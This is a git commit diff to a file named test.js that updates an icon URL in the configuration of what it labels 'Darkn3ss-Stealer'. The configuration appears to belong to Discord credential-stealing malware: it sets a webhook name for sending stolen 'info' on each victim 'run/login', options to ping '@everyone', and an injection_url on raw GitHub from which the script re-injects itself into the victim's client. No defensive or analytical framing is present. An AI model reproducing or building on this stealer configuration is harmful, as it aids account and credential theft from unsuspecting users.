bbf198434fe8d247f73cef43216b122e415c9040
ICoolBuddy <81433896+ICoolBuddy@users.noreply.github.com>
2023-10-28 18:56:32 +0300

    Update test.js

--- test.js
+++ test.js
@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Darkn3ss-Stealer', //name of the webhook thats gonna send the info
-  embed_icon: 'https://media.discordapp.net/attachments/1158616227304980501/1167490102658859020/download.jpeg', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://raw.githubusercontent.com/ICoolBuddy/aderre/main/oda.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/ICoolBuddy/aderre/main/test.js', //injection url for when it reinjects
   /**
